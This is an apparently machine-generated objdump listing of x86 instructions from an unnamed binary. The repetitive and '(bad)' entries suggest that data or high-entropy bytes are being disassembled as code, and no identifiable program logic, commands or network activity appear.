  44bdfb:	add    al,BYTE PTR [eax]
  44bdfd:	bound  eax,QWORD PTR [edx]
  44bdff:	add    al,BYTE PTR [eax]
  44be01:	bound  eax,QWORD PTR [edx]
  44be03:	add    al,BYTE PTR [eax]
  44be05:	bound  eax,QWORD PTR [edx]
  44be07:	add    al,BYTE PTR [eax]
  44be09:	bound  eax,QWORD PTR [edx]
  44be0b:	add    al,BYTE PTR [eax]
  44be0d:	bound  eax,QWORD PTR [edx]
  44be0f:	add    al,BYTE PTR [eax]
  44be11:	bound  eax,QWORD PTR [edx]
  44be13:	add    al,BYTE PTR [eax]
  44be15:	bound  eax,QWORD PTR [edx]
  44be17:	add    al,BYTE PTR [eax]
  44be19:	bound  eax,QWORD PTR [edx]
  44be1b:	add    al,BYTE PTR [eax]
  44be1d:	bound  eax,QWORD PTR [edx]
  44be1f:	add    al,BYTE PTR [eax]
  44be21:	bound  eax,QWORD PTR [eax]
  44be23:	add    al,BYTE PTR [eax]
  44be25:	bound  eax,QWORD PTR [eax]
  44be27:	add    al,BYTE PTR [eax]
  44be29:	bound  eax,QWORD PTR [eax]
  44be2b:	add    al,BYTE PTR [eax]
  44be2d:	bound  eax,QWORD PTR [eax]
  44be2f:	add    al,BYTE PTR [eax]
  44be31:	add    BYTE PTR [edx+0x0],ah
  44be34:	add    al,BYTE PTR [eax]
  44be36:	bound  eax,QWORD PTR [eax]
  44be38:	add    al,BYTE PTR [eax]
  44be3a:	(bad)  
  44be3b:	(bad)  
  44be3d:	add    esp,DWORD PTR [edx-0x27]
  44be40:	out    0x3,eax
  44be42:	(bad)  
  44be43:	(bad)  
  44be45:	add    esp,DWORD PTR [edx-0x27]
  44be48:	out    0x3,eax
  44be4a:	(bad)  
  44be4b:	(bad)  
  44be4d:	add    esp,DWORD PTR [edx-0x27]
  44be50:	out    0x3,eax
  44be52:	(bad)  
  44be53:	(bad)  
  44be55:	add    esp,DWORD PTR [edx-0x27]
  44be58:	out    0x3,eax
  44be5a:	(bad)  
  44be5b:	(bad)  
  44be5d:	add    esp,DWORD PTR [edx-0x27]
  44be60:	out    0x3,eax
  44be62:	(bad)  
  44be63:	(bad)  
  44be65:	add    esp,DWORD PTR [edx-0x27]
  44be68:	out    0x3,eax
  44be6a:	(bad)  
  44be6b:	(bad)  
  44be6d:	add    esp,DWORD PTR [edx-0x27]
  44be70:	out    0x3,eax
  44be72:	(bad)  
  44be73:	(bad)  
  44be75:	add    esp,DWORD PTR [edx-0x27]
  44be78:	out    0x3,eax
  44be7a:	(bad)  
  44be7b:	(bad)  
  44be7d:	add    esp,DWORD PTR [edx-0x27]
  44be80:	out    0x3,eax
  44be82:	(bad)  
  44be83:	(bad)  
  44be85:	add    esp,DWORD PTR [edx-0x27]
  44be88:	out    0x3,eax
  44be8a:	(bad)  
  44be8b:	(bad)  
  44be8d:	add    esp,DWORD PTR [edx-0x27]
  44be90:	out    0x3,eax
  44be92:	(bad)  
  44be93:	(bad)  
  44be95:	add    eax,DWORD PTR [eax]
  44be97:	(bad)  
  44be98:	(bad)  
  44be9a:	add    esp,DWORD PTR [edx-0x27]
  44be9d:	out    0x3,eax
  44be9f:	(bad)  
  44bea0:	(bad)  
  44bea2:	add    esp,DWORD PTR [edx-0x27]
  44bea5:	out    0x3,eax
  44bea7:	(bad)  
  44bea8:	(bad)  
  44beaa:	add    esp,DWORD PTR [edx-0x27]
  44bead:	out    0x3,eax
  44beaf:	(bad)  
  44beb0:	(bad)  
  44beb2:	add    esp,DWORD PTR [edx-0x27]
  44beb5:	add    cl,ch
  44beb7:	popa   
  44beb8:	fld    DWORD PTR [eax]
  44beba:	jmp    0xe9459820
  44bebf:	popa   
  44bec0:	fld    DWORD PTR [eax]
  44bec2:	jmp    0xe9459828
  44bec7:	popa   
  44bec8:	fld    DWORD PTR [eax]
  44beca:	jmp    0xe9459830
  44becf:	popa   
  44bed0:	fld    DWORD PTR [eax]
  44bed2:	jmp    0xe9459838
  44bed7:	popa   
  44bed8:	fld    DWORD PTR [eax]
  44beda:	jmp    0xe9459840
  44bedf:	popa   
  44bee0:	fld    DWORD PTR [eax]
  44bee2:	jmp    0xe9459848
  44bee7:	popa   
  44bee8:	fld    DWORD PTR [eax]
  44beea:	jmp    0xe9459850
  44beef:	popa   
  44bef0:	fld    DWORD PTR [eax]
  44bef2:	jmp    0xe9459858
  44bef7:	popa   
  44bef8:	fld    DWORD PTR [eax]
  44befa:	jmp    0x11e1fff
  44beff:	jmp    0xe9459865
  44bf04:	popa   
  44bf05:	fld    DWORD PTR [eax]
  44bf07:	jmp    0xe945986d
  44bf0c:	popa   
  44bf0d:	fld    DWORD PTR [eax]
  44bf0f:	jmp    0xe9459875
  44bf14:	popa   
  44bf15:	fld    DWORD PTR [eax]
  44bf17:	jmp    0xe945987d
  44bf1c:	popa   
  44bf1d:	fld    DWORD PTR [eax]
  44bf1f:	jmp    0xe9459885
  44bf24:	popa   
  44bf25:	fld    DWORD PTR [eax]
  44bf27:	jmp    0xe945988d
  44bf2c:	popa   
  44bf2d:	fld    DWORD PTR [eax]
  44bf2f:	add    BYTE PTR [ebx],bh
  44bf31:	fld    DWORD PTR [eax]
  44bf33:	add    BYTE PTR [ebx-0x27],cl
  44bf36:	add    BYTE PTR [eax],al
  44bf38:	dec    ebx
  44bf39:	fld    DWORD PTR [eax]
  44bf3b:	add    BYTE PTR [ebx],bh
  44bf3d:	fld    DWORD PTR [eax]
  44bf3f:	add    BYTE PTR [ebx],bh
  44bf41:	fld    DWORD PTR [eax]
  44bf43:	add    BYTE PTR [ebx],cl
  44bf45:	fld    DWORD PTR [eax]
  44bf47:	add    BYTE PTR [ebx],cl
  44bf49:	fld    DWORD PTR [eax]
  44bf4b:	add    bl,bh
  44bf4d:	fadd   DWORD PTR [eax]
  44bf4f:	add    bl,bh
  44bf51:	fadd   DWORD PTR [eax]
  44bf53:	add    BYTE PTR [ebx],cl
  44bf55:	fld    DWORD PTR [eax]
  44bf57:	add    BYTE PTR [ebx],cl
  44bf59:	fld    DWORD PTR [eax]
  44bf5b:	add    bl,bh
  44bf5d:	fadd   DWORD PTR [eax]
  44bf5f:	add    BYTE PTR [eax],al
  44bf61:	sti    
  44bf62:	fadd   DWORD PTR [eax]
  44bf64:	add    bl,cl
  44bf66:	fadd   DWORD PTR [eax]
  44bf68:	add    bl,cl
  44bf6a:	fadd   DWORD PTR [eax]
  44bf6c:	add    BYTE PTR [ebx-0x44ffff28],bh
  44bf72:	fadd   DWORD PTR [eax]
  44bf74:	add    bl,cl
  44bf76:	fadd   DWORD PTR [eax]
  44bf78:	add    bl,cl
  44bf7a:	fadd   DWORD PTR [eax]
  44bf7c:	add    BYTE PTR [ebx-0x44ffff28],bh
  44bf82:	fadd   DWORD PTR [eax]
  44bf84:	add    BYTE PTR [ebx-0x74ffff28],cl
  44bf8a:	fadd   DWORD PTR [eax]
  44bf8c:	add    BYTE PTR [ebx-0x28],bh
  44bf8f:	add    BYTE PTR [eax],al
  44bf91:	jnp    0x44bf6b
  44bf93:	add    BYTE PTR [eax],al
  44bf95:	mov    ebx,eax
  44bf97:	add    BYTE PTR [eax],al
  44bf99:	mov    ebx,eax
  44bf9b:	add    BYTE PTR [eax],al
  44bf9d:	jnp    0x44bf77
  44bf9f:	add    BYTE PTR [eax],al
  44bfa1:	jnp    0x44bf7b
  44bfa3:	add    BYTE PTR [eax],al
  44bfa5:	dec    ebx
  44bfa6:	fadd   DWORD PTR [eax]
  44bfa8:	add    BYTE PTR [edx+0x2],ah
  44bfab:	add    al,BYTE PTR [eax]
  44bfad:	bound  eax,QWORD PTR [edx]
  44bfaf:	add    al,BYTE PTR [eax]
  44bfb1:	bound  eax,QWORD PTR [edx]
  44bfb3:	add    al,BYTE PTR [eax]
  44bfb5:	bound  eax,QWORD PTR [edx]
  44bfb7:	add    al,BYTE PTR [eax]
  44bfb9:	bound  eax,QWORD PTR [edx]
  44bfbb:	add    al,BYTE PTR [eax]
  44bfbd:	bound  eax,QWORD PTR [edx]
  44bfbf:	add    al,BYTE PTR [eax]
  44bfc1:	bound  eax,QWORD PTR [edx]
  44bfc3:	add    al,BYTE PTR [eax]
  44bfc5:	add    BYTE PTR [edx+0x2],ah
  44bfc8:	add    al,BYTE PTR [eax]
  44bfca:	bound  eax,QWORD PTR [edx]
  44bfcc:	add    al,BYTE PTR [eax]
  44bfce:	bound  eax,QWORD PTR [edx]
  44bfd0:	add    al,BYTE PTR [eax]
  44bfd2:	bound  eax,QWORD PTR [edx]
  44bfd4:	add    al,BYTE PTR [eax]
  44bfd6:	bound  eax,QWORD PTR [edx]
  44bfd8:	add    al,BYTE PTR [eax]
  44bfda:	bound  eax,QWORD PTR [edx]
  44bfdc:	add    al,BYTE PTR [eax]
  44bfde:	bound  eax,QWORD PTR [edx]
  44bfe0:	add    al,BYTE PTR [eax]
  44bfe2:	bound  eax,QWORD PTR [edx]
  44bfe4:	add    al,BYTE PTR [eax]
  44bfe6:	bound  eax,QWORD PTR [edx]
  44bfe8:	add    al,BYTE PTR [eax]
  44bfea:	bound  eax,QWORD PTR [edx]
  44bfec:	add    al,BYTE PTR [eax]
  44bfee:	bound  eax,QWORD PTR [edx]
  44bff0:	add    al,BYTE PTR [eax]
  44bff2:	bound  eax,QWORD PTR [edx]
  44bff4:	add    al,BYTE PTR [eax]
  44bff6:	bound  eax,QWORD PTR [edx]
  44bff8:	add    al,BYTE PTR [eax]
  44bffa:	bound  eax,QWORD PTR [edx]
  44bffc:	add    al,BYTE PTR [eax]
  44bffe:	bound  eax,QWORD PTR [edx]
  44c000:	add    al,BYTE PTR [eax]
  44c002:	bound  eax,QWORD PTR [edx]
  44c004:	add    al,BYTE PTR [eax]
  44c006:	bound  eax,QWORD PTR [edx]
  44c008:	add    al,BYTE PTR [eax]
  44c00a:	bound  eax,QWORD PTR [edx]
  44c00c:	add    al,BYTE PTR [eax]
  44c00e:	bound  eax,QWORD PTR [edx]
  44c010:	add    al,BYTE PTR [eax]
  44c012:	bound  eax,QWORD PTR [edx]
  44c014:	add    al,BYTE PTR [eax]
  44c016:	bound  eax,QWORD PTR [edx]
  44c018:	add    al,BYTE PTR [eax]
  44c01a:	bound  eax,QWORD PTR [edx]
  44c01c:	add    al,BYTE PTR [eax]
  44c01e:	bound  eax,QWORD PTR [edx]
  44c020:	add    al,BYTE PTR [eax]
  44c022:	(bad)  
  44c023:	(bad)  
  44c025:	add    esp,DWORD PTR [edx-0x27]
  44c028:	out    0x3,eax
  44c02a:	add    BYTE PTR [edx-0x27],ah
  44c02d:	out    0x3,eax
  44c02f:	(bad)  
  44c030:	(bad)  
  44c032:	add    esp,DWORD PTR [edx-0x27]
  44c035:	out    0x3,eax
  44c037:	(bad)  
  44c038:	(bad)  
  44c03a:	add    esp,DWORD PTR [edx-0x27]
  44c03d:	out    0x3,eax
  44c03f:	(bad)  
  44c040:	(bad)  
  44c042:	add    esp,DWORD PTR [edx-0x27]
  44c045:	out    0x3,eax
  44c047:	(bad)  
  44c048:	(bad)  
  44c04a:	add    esp,DWORD PTR [edx-0x27]
  44c04d:	out    0x3,eax
  44c04f:	(bad)  
  44c050:	(bad)  
  44c052:	add    esp,DWORD PTR [edx-0x27]
  44c055:	out    0x3,eax
  44c057:	(bad)  
  44c058:	(bad)  
  44c05a:	add    esp,DWORD PTR [edx-0x27]
  44c05d:	out    0x3,eax
  44c05f:	(bad)  
  44c060:	(bad)  
  44c062:	add    esp,DWORD PTR [edx-0x27]
  44c065:	out    0x3,eax
  44c067:	(bad)  
  44c068:	(bad)  
  44c06a:	add    esp,DWORD PTR [edx-0x27]
  44c06d:	out    0x3,eax
  44c06f:	(bad)  
  44c070:	(bad)  
  44c072:	add    esp,DWORD PTR [edx-0x27]
  44c075:	out    0x3,eax
  44c077:	(bad)  
  44c078:	(bad)  
  44c07a:	add    esp,DWORD PTR [edx-0x27]
  44c07d:	out    0x3,eax
  44c07f:	(bad)  
  44c080:	(bad)  
  44c082:	add    esp,DWORD PTR [edx-0x27]
  44c085:	out    0x3,eax
  44c087:	(bad)  
  44c088:	(bad)  
  44c08a:	add    esp,DWORD PTR [edx-0x27]
  44c08d:	out    0x3,eax
  44c08f:	add    BYTE PTR [edx-0x27],ah
  44c092:	out    0x3,eax
  44c094:	(bad)  
  44c095:	(bad)  
  44c097:	add    esp,DWORD PTR [edx-0x27]
  44c09a:	out    0x3,eax
  44c09c:	(bad)  
  44c09d:	fld    DWORD PTR [eax]
  44c09f:	jmp    0xe9459a05
  44c0a4:	popa   
  44c0a5:	fld    DWORD PTR [eax]
  44c0a7:	jmp    0xe9459a0d
  44c0ac:	popa   
  44c0ad:	fld    DWORD PTR [eax]
  44c0af:	jmp    0xe9459a15
  44c0b4:	popa   
  44c0b5:	fld    DWORD PTR [eax]
  44c0b7:	jmp    0xe9459a1d
  44c0bc:	popa   
  44c0bd:	fld    DWORD PTR [eax]
  44c0bf:	jmp    0xe9459a25
  44c0c4:	popa   
  44c0c5:	fld    DWORD PTR [eax]
  44c0c7:	jmp    0xe9459a2d
  44c0cc:	popa   
  44c0cd:	fld    DWORD PTR [eax]
  44c0cf:	jmp    0xe9459a35
  44c0d4:	popa   
  44c0d5:	fld    DWORD PTR [eax]
  44c0d7:	jmp    0xe9459a3d
  44c0dc:	popa   
  44c0dd:	fld    DWORD PTR [eax]
  44c0df:	jmp    0xe9459a45
  44c0e4:	popa   
  44c0e5:	fld    DWORD PTR [eax]
  44c0e7:	jmp    0xe9459a4d
  44c0ec:	popa   
  44c0ed:	fld    DWORD PTR [eax]
  44c0ef:	jmp    0xe9459a55
  44c0f4:	add    BYTE PTR [ecx-0x27],ah
  44c0f7:	add    cl,ch
  44c0f9:	popa   
  44c0fa:	fld    DWORD PTR [eax]
  44c0fc:	jmp    0xe9459a62
  44c101:	popa   
  44c102:	fld    DWORD PTR [eax]
  44c104:	jmp    0xe9459a6a
  44c109:	popa   
  44c10a:	fld    DWORD PTR [eax]
  44c10c:	jmp    0xe9459a72
  44c111:	popa   
  44c112:	fld    DWORD PTR [eax]
  44c114:	jmp    0x459a7a
  44c119:	mov    edx,ebp
  44c11b:	add    BYTE PTR [eax],al
  44c11d:	mov    edx,ebp
  44c11f:	add    BYTE PTR [eax],al
  44c121:	jnp    0x44c0f8
  44c123:	add    BYTE PTR [eax],al
  44c125:	jnp    0x44c0fc
  44c127:	add    BYTE PTR [eax],al
  44c129:	dec    ebx
  44c12a:	fld    QWORD PTR [eax]
  44c12c:	add    BYTE PTR [ebx-0x23],cl
  44c12f:	add    BYTE PTR [eax],al
  44c131:	cmp    ebx,ebp
  44c133:	add    BYTE PTR [eax],al
  44c135:	cmp    ebx,ebp
  44c137:	add    BYTE PTR [eax],al
  44c139:	dec    ebx
  44c13a:	fld    QWORD PTR [eax]
  44c13c:	add    BYTE PTR [ebx-0x23],cl
  44c13f:	add    BYTE PTR [eax],al
  44c141:	cmp    ebx,ebp
  44c143:	add    BYTE PTR [eax],al
  44c145:	cmp    ebx,ebp
  44c147:	add    BYTE PTR [eax],al
  44c149:	or     ebx,ebp
  44c14b:	add    BYTE PTR [eax],al
  44c14d:	or     ebx,ebp
  44c14f:	add    BYTE PTR [eax],al
  44c151:	sti    
  44c152:	fadd   QWORD PTR [eax]
  44c154:	add    bl,bh
  44c156:	fadd   QWORD PTR [eax]
  44c158:	add    BYTE PTR [eax],al
  44c15a:	or     ebx,ebp
  44c15c:	add    BYTE PTR [eax],al
  44c15e:	or     ebx,ebp
  44c160:	add    BYTE PTR [eax],al
  44c162:	sti    
  44c163:	fadd   QWORD PTR [eax]
  44c165:	add    bl,bh
  44c167:	fadd   QWORD PTR [eax]
  44c169:	add    bl,cl
  44c16b:	fadd   QWORD PTR [eax]
  44c16d:	add    bl,cl
  44c16f:	fadd   QWORD PTR [eax]
  44c171:	add    BYTE PTR [ebx-0x44ffff24],bh
  44c177:	fadd   QWORD PTR [eax]
  44c179:	add    bl,cl
  44c17b:	fadd   QWORD PTR [eax]
  44c17d:	add    bl,cl
  44c17f:	fadd   QWORD PTR [eax]
  44c181:	add    BYTE PTR [ebx-0x44ffff24],bh
  44c187:	fadd   QWORD PTR [eax]
  44c189:	add    BYTE PTR [ebx-0x74ffff24],cl
  44c18f:	fadd   QWORD PTR [eax]
  44c191:	add    BYTE PTR [edx-0xe],ah
  44c194:	add    DWORD PTR [eax],eax
  44c196:	(bad)  
  44c198:	add    DWORD PTR [eax],eax
  44c19a:	(bad)  
  44c19c:	add    DWORD PTR [eax],eax
  44c19e:	(bad)  
  44c1a0:	add    DWORD PTR [eax],eax
  44c1a2:	(bad)  
  44c1a4:	add    DWORD PTR [eax],eax
  44c1a6:	(bad)  
  44c1a8:	add    DWORD PTR [eax],eax
  44c1aa:	(bad)  
  44c1ac:	add    DWORD PTR [eax],eax
  44c1ae:	(bad)  
  44c1b0:	add    DWORD PTR [eax],eax
  44c1b2:	(bad)  
  44c1b4:	add    DWORD PTR [eax],eax
  44c1b6:	(bad)  
  44c1b8:	add    DWORD PTR [eax],eax
  44c1ba:	(bad)  
  44c1bc:	add    DWORD PTR [eax],eax
  44c1be:	add    BYTE PTR [edx-0xe],ah
  44c1c1:	add    DWORD PTR [eax],eax
  44c1c3:	(bad)  
  44c1c5:	add    DWORD PTR [eax],eax
  44c1c7:	(bad)  
  44c1c9:	add    DWORD PTR [eax],eax
  44c1cb:	(bad)  
  44c1cd:	add    DWORD PTR [eax],eax
  44c1cf:	(bad)  
  44c1d1:	add    DWORD PTR [eax],eax
  44c1d3:	(bad)  
  44c1d5:	add    DWORD PTR [eax],eax
  44c1d7:	(bad)  
  44c1d9:	add    DWORD PTR [eax],eax
  44c1db:	(bad)  
  44c1dd:	add    DWORD PTR [eax],eax
  44c1df:	(bad)  
  44c1e1:	add    DWORD PTR [eax],eax
  44c1e3:	(bad)  
  44c1e5:	add    DWORD PTR [eax],eax
  44c1e7:	(bad)  
  44c1e9:	add    DWORD PTR [eax],eax
  44c1eb:	(bad)  
  44c1ed:	add    DWORD PTR [eax],eax
  44c1ef:	(bad)  
  44c1f1:	add    DWORD PTR [eax],eax
  44c1f3:	(bad)  
  44c1f5:	add    DWORD PTR [eax],eax
  44c1f7:	(bad)  
  44c1f9:	add    DWORD PTR [eax],eax
  44c1fb:	(bad)  
  44c1fd:	add    DWORD PTR [eax],eax
  44c1ff:	(bad)  
  44c201:	add    DWORD PTR [eax],eax
  44c203:	(bad)  
  44c205:	add    DWORD PTR [eax],eax
  44c207:	(bad)  
  44c209:	add    DWORD PTR [eax],eax
  44c20b:	(bad)  
  44c20c:	(bad)  
  44c20e:	add    esp,DWORD PTR [edx-0x27]
  44c211:	out    0x3,eax
  44c213:	(bad)  
  44c214:	(bad)  
  44c216:	add    esp,DWORD PTR [edx-0x27]
  44c219:	out    0x3,eax
  44c21b:	(bad)  
  44c21c:	(bad)  
  44c21e:	add    esp,DWORD PTR [edx-0x27]
  44c221:	out    0x3,eax
  44c223:	add    BYTE PTR [edx-0x27],ah
  44c226:	out    0x3,eax
  44c228:	(bad)  
  44c229:	(bad)  
  44c22b:	add    esp,DWORD PTR [edx-0x27]
  44c22e:	out    0x3,eax
  44c230:	(bad)  
  44c231:	(bad)  
  44c233:	add    esp,DWORD PTR [edx-0x27]
  44c236:	out    0x3,eax
  44c238:	(bad)  
  44c239:	(bad)  
  44c23b:	add    esp,DWORD PTR [edx-0x27]
  44c23e:	out    0x3,eax
  44c240:	(bad)  
  44c241:	(bad)  
  44c243:	add    esp,DWORD PTR [edx-0x27]
  44c246:	out    0x3,eax
  44c248:	(bad)  
  44c249:	(bad)  
  44c24b:	add    esp,DWORD PTR [edx-0x27]
  44c24e:	out    0x3,eax
  44c250:	(bad)  
  44c251:	(bad)  
  44c253:	add    esp,DWORD PTR [edx-0x27]
  44c256:	out    0x3,eax
  44c258:	(bad)  
  44c259:	(bad)  
  44c25b:	add    esp,DWORD PTR [edx-0x27]
  44c25e:	out    0x3,eax
  44c260:	(bad)  
  44c261:	(bad)  
  44c263:	add    esp,DWORD PTR [edx-0x27]
  44c266:	out    0x3,eax
  44c268:	(bad)  
  44c269:	(bad)  
  44c26b:	add    esp,DWORD PTR [edx-0x27]
  44c26e:	out    0x3,eax
  44c270:	(bad)  
  44c271:	(bad)  
  44c273:	add    esp,DWORD PTR [edx-0x27]
  44c276:	out    0x3,eax
  44c278:	(bad)  
  44c279:	(bad)  
  44c27b:	add    esp,DWORD PTR [edx-0x27]
  44c27e:	out    0x3,eax
  44c280:	(bad)  
  44c281:	(bad)  
  44c283:	add    esp,DWORD PTR [edx-0x27]
  44c286:	add    cl,ch
  44c288:	add    BYTE PTR [ecx-0x27],ah
  44c28b:	add    cl,ch
  44c28d:	popa   
  44c28e:	fld    DWORD PTR [eax]
  44c290:	jmp    0xe9459bf6
  44c295:	popa   
  44c296:	fld    DWORD PTR [eax]
  44c298:	jmp    0xe9459bfe
  44c29d:	popa   
  44c29e:	fld    DWORD PTR [eax]
  44c2a0:	jmp    0xe9459c06
  44c2a5:	popa   
  44c2a6:	fld    DWORD PTR [eax]
  44c2a8:	jmp    0xe9459c0e
  44c2ad:	popa   
  44c2ae:	fld    DWORD PTR [eax]
  44c2b0:	jmp    0xe9459c16
  44c2b5:	popa   
  44c2b6:	fld    DWORD PTR [eax]
  44c2b8:	jmp    0xe9459c1e
  44c2bd:	popa   
  44c2be:	fld    DWORD PTR [eax]
  44c2c0:	jmp    0xe9459c26
  44c2c5:	popa   
  44c2c6:	fld    DWORD PTR [eax]
  44c2c8:	jmp    0xe9459c2e
  44c2cd:	popa   
  44c2ce:	fld    DWORD PTR [eax]
  44c2d0:	jmp    0xe9459c36
  44c2d5:	popa   
  44c2d6:	fld    DWORD PTR [eax]
  44c2d8:	jmp    0xe9459c3e
  44c2dd:	popa   
  44c2de:	fld    DWORD PTR [eax]
  44c2e0:	jmp    0xe9459c46
  44c2e5:	popa   
  44c2e6:	fld    DWORD PTR [eax]
  44c2e8:	jmp    0xe9459c4e
  44c2ed:	add    BYTE PTR [ecx-0x27],ah
  44c2f0:	add    cl,ch
  44c2f2:	popa   
  44c2f3:	fld    DWORD PTR [eax]
  44c2f5:	jmp    0xe9459c5b
  44c2fa:	popa   
  44c2fb:	fld    DWORD PTR [eax]
  44c2fd:	jmp    0x459c63
  44c302:	retf   
  44c303:	fld    DWORD PTR [eax]
  44c305:	add    BYTE PTR [ebx-0x44ffff27],bh
  44c30b:	fld    DWORD PTR [eax]
  44c30d:	add    BYTE PTR [ebx-0x74ffff27],cl
  44c313:	fld    DWORD PTR [eax]
  44c315:	add    BYTE PTR [ebx-0x27],bh
  44c318:	add    BYTE PTR [eax],al
  44c31a:	jnp    0x44c2f5
  44c31c:	add    BYTE PTR [eax],al
  44c31e:	mov    ebx,ecx
  44c320:	add    BYTE PTR [eax],al
  44c322:	mov    ebx,ecx
  44c324:	add    BYTE PTR [eax],al
  44c326:	jnp    0x44c301
  44c328:	add    BYTE PTR [eax],al
  44c32a:	jnp    0x44c305
  44c32c:	add    BYTE PTR [eax],al
  44c32e:	dec    ebx
  44c32f:	fld    DWORD PTR [eax]
  44c331:	add    BYTE PTR [ebx-0x27],cl
  44c334:	add    BYTE PTR [eax],al
  44c336:	cmp    ebx,ecx
  44c338:	add    BYTE PTR [eax],al
  44c33a:	cmp    ebx,ecx
  44c33c:	add    BYTE PTR [eax],al
  44c33e:	dec    ebx
  44c33f:	fld    DWORD PTR [eax]
  44c341:	add    BYTE PTR [ebx-0x27],cl
  44c344:	add    BYTE PTR [eax],al
  44c346:	cmp    ebx,ecx
  44c348:	add    BYTE PTR [eax],al
  44c34a:	cmp    ebx,ecx
  44c34c:	add    BYTE PTR [eax],al
  44c34e:	or     ebx,ecx
  44c350:	add    BYTE PTR [eax],al
  44c352:	add    BYTE PTR [ebx],cl
  44c354:	fld    DWORD PTR [eax]
  44c356:	add    bl,bh
  44c358:	fadd   DWORD PTR [eax]
  44c35a:	add    bl,bh
  44c35c:	fadd   DWORD PTR [eax]
  44c35e:	add    BYTE PTR [ebx],cl
  44c360:	fld    DWORD PTR [eax]
  44c362:	add    BYTE PTR [ebx],cl
  44c364:	fld    DWORD PTR [eax]
  44c366:	add    bl,bh
  44c368:	fadd   DWORD PTR [eax]
  44c36a:	add    bl,bh
  44c36c:	fadd   DWORD PTR [eax]
  44c36e:	add    bl,cl
  44c370:	fadd   DWORD PTR [eax]
  44c372:	add    bl,cl
  44c374:	fadd   DWORD PTR [eax]
  44c376:	add    BYTE PTR [ebx+0x620000d8],bh
  44c37c:	repnz add DWORD PTR [eax],eax
  44c37f:	(bad)  
  44c381:	add    DWORD PTR [eax],eax
  44c383:	(bad)  
  44c385:	add    DWORD PTR [eax],eax
  44c387:	(bad)  
  44c389:	add    DWORD PTR [eax],eax
  44c38b:	(bad)  
  44c38d:	add    DWORD PTR [eax],eax
  44c38f:	(bad)  
  44c391:	add    DWORD PTR [eax],eax
  44c393:	(bad)  
  44c395:	add    DWORD PTR [eax],eax
  44c397:	(bad)  
  44c399:	add    DWORD PTR [eax],eax
  44c39b:	(bad)  
  44c39d:	add    DWORD PTR [eax],eax
  44c39f:	(bad)  
  44c3a1:	add    DWORD PTR [eax],eax
  44c3a3:	(bad)  
  44c3a5:	add    DWORD PTR [eax],eax
  44c3a7:	(bad)  
  44c3a9:	add    DWORD PTR [eax],eax
  44c3ab:	(bad)  
  44c3ad:	add    DWORD PTR [eax],eax
  44c3af:	(bad)  
  44c3b1:	add    DWORD PTR [eax],eax
  44c3b3:	(bad)  
  44c3b5:	add    DWORD PTR [eax],eax
  44c3b7:	add    BYTE PTR [edx-0xe],ah
  44c3ba:	add    DWORD PTR [eax],eax
  44c3bc:	bound  esp,QWORD PTR [esi-0x22]
  44c3bf:	mov    al,0x5
  44c3c1:	pop    ecx
  44c3c2:	imul   esp,DWORD PTR [edi+eiz*4+0x5a],0xffffffa2
  44c3c7:	enter  0xfa0b,0xf
  44c3cb:	mov    si,0x38c5
  44c3cf:	adc    al,BYTE PTR [ebp+0x4c]
  44c3d2:	pop    ecx
  44c3d3:	call   FWORD PTR [esi]
  44c3d5:	adc    ch,dh
  44c3d7:	pusha  
  44c3d8:	shr    BYTE PTR [esp+edi*2-0xe],cl
  44c3dc:	imul   DWORD PTR [edx]
  44c3de:	dec    esp
  44c3df:	dec    esp
  44c3e0:	ins    DWORD PTR es:[edi],dx
  44c3e1:	or     edx,ebp
  44c3e3:	sub    eax,DWORD PTR [ecx+0x2268f215]
  44c3e9:	inc    eax
  44c3ea:	and    al,0x40
  44c3ec:	cmp    dh,BYTE PTR [ebx+ebp*8+0xa]
  44c3f0:	cmc    
  44c3f1:	mov    WORD PTR [esi-0x2726fb6b],ds
  44c3f7:	scas   eax,DWORD PTR es:[edi]
  44c3f8:	cld    
  44c3f9:	mov    eax,ds:0x413df999
  44c3fe:	xchg   esi,eax
  44c3ff:	add    BYTE PTR [esi+0x29],bh
  44c402:	loope  0x44c3b7
  44c404:	les    edx,FWORD PTR [edx+0x4daf07dc]
  44c40a:	pusha  
  44c40b:	sub    ah,cl
  44c40d:	mov    ebp,ebx
  44c40f:	call   0x5e30213a
  44c414:	ret    0x72c5
  44c417:	sbb    al,0x3f
  44c419:	mov    ah,0xee
  44c41b:	mov    eax,0x52dcdc00
  44c420:	add    al,0xd0
  44c422:	xor    eax,0x7984fa71
  44c427:	mov    ds:0x29548422,al
  44c42c:	rcr    DWORD PTR ds:0xdf5c01d8,cl
  44c432:	ret    
  44c433:	bound  eax,QWORD PTR ss:[edi+0x44]
  44c437:	sbb    dh,ch
  44c439:	xchg   ebp,eax
  44c43a:	aad    0x3e
  44c43c:	jp     0x44c3f5
  44c43e:	jecxz  0x44c447
  44c440:	push   ecx
  44c441:	push   edx
  44c442:	pop    ss
  44c443:	not    BYTE PTR [ebx-0x6a2b4470]
  44c449:	xchg   edi,eax
  44c44a:	test   al,0xe1
  44c44c:	dec    edx
  44c44d:	jbe    0x44c468
  44c44f:	adc    al,0xd3
  44c451:	add    eax,0xb200f938
  44c456:	test   BYTE PTR [ebx+0x77],0x5
  44c45a:	or     al,0x1a
  44c45c:	stos   BYTE PTR es:[edi],al
  44c45d:	mov    ds,WORD PTR [ecx-0x2c]
  44c460:	xchg   ecx,eax
  44c461:	jne    0x44c3f9
  44c463:	push   0xffffffe8
  44c465:	gs aas 
  44c467:	(bad)  
  44c468:	mov    cl,0x9a
  44c46a:	popa   
  44c46b:	retf   
  44c46c:	sahf   
  44c46d:	cli    
  44c46e:	popf   
  44c46f:	add    BYTE PTR [eax],dh
  44c471:	mov    BYTE PTR [ebx-0x3],dh
  44c474:	push   esi
  44c475:	(bad)
  44c47a:	pop    ds
  44c47b:	jae    0x44c429
  44c47d:	xor    ecx,DWORD PTR [eax+0x21]
  44c480:	mov    eax,DWORD PTR [eax]
  44c482:	cld    
  44c483:	fwait
  44c484:	sub    DWORD PTR [edi-0x6],edx
  44c487:	std    
  44c488:	shr    DWORD PTR [ebp+0x45f4029a],cl
  44c48e:	lahf   
  44c48f:	pushf  
  44c490:	sub    BYTE PTR [esi-0x1ca1af01],al
  44c496:	sub    DWORD PTR [ecx+0x8],esp
  44c499:	mov    ah,0xae
  44c49b:	jno    0x44c4f4
  44c49d:	mov    bh,bl
  44c49f:	popa   
  44c4a0:	pop    edi
  44c4a1:	pop    edx
  44c4a2:	mov    eax,0x42b7fdff
  44c4a7:	(bad)  
  44c4a8:	push   edx
  44c4a9:	push   0x5d
  44c4ab:	je     0x44c522
  44c4ad:	inc    esp
  44c4ae:	lock pop edx
  44c4b0:	jb     0x44c48c
  44c4b2:	cmp    ax,0xb31a
  44c4b6:	imul   edi,DWORD PTR [edi],0x873dcdb6
